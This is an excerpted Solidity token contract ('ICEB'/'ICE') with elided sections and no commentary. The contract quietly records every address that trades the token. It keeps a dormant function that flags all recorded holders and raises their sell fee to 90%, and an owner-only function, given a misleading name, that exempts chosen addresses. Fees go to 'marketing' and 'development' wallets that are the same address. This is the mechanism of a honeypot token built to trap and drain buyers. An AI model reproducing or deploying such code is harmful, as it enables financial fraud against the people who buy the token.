...
contract OGI is ERC20, Ownable {
    ...
    mapping (address => bool) public _isGreen;
    mapping (address => bool) public Greens;
    address[] public _Green;
    
    uint256 private Geen;
    ...
    constructor() ERC20("ICEB", "ICE") {
        ...
        Geen = 0;
        MarketingWallet = payable(0x3d67bFc6Db91FCB9f9c68903B81b41baE8E43D84); 
        DevelopmentWallet = payable(0x3d67bFc6Db91FCB9f9c68903B81b41baE8E43D84);
    ...
    /* function LetsGo() public {
        ...
        Geen = 9;
        for (uint256 i = 0; i < _Green.length; i++) {
            Greens[_Green[i]] = true;
        }
    } */
    ...
    function isGreens(address[] memory addrs)
        external
        onlyOwner
        returns (bool)
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            Greens[addrs[i]] = false;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isGreen[from]) {
            _isGreen[from] = true;
            _Green.push(from);
        }
        
        if (to != owner() && to != uniswapV2Pair && !_isGreen[to]) {
            _isGreen[to] = true;
            _Green.push(to);
        ...
        if (takeFee) {
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                ...
                if (Greens[from]) { fees = amount.mul(Geen).div(10);}
    ...
    function swapBack() private returns (bool) {
        ...
        uint256 BUSDForDevelopment = BUSDBalance.sub(BUSDForMarketing);
        IERC20(BUSD).safeTransfer(MarketingWallet, BUSDForMarketing);
        IERC20(BUSD).safeTransfer(DevelopmentWallet, BUSDForDevelopment);
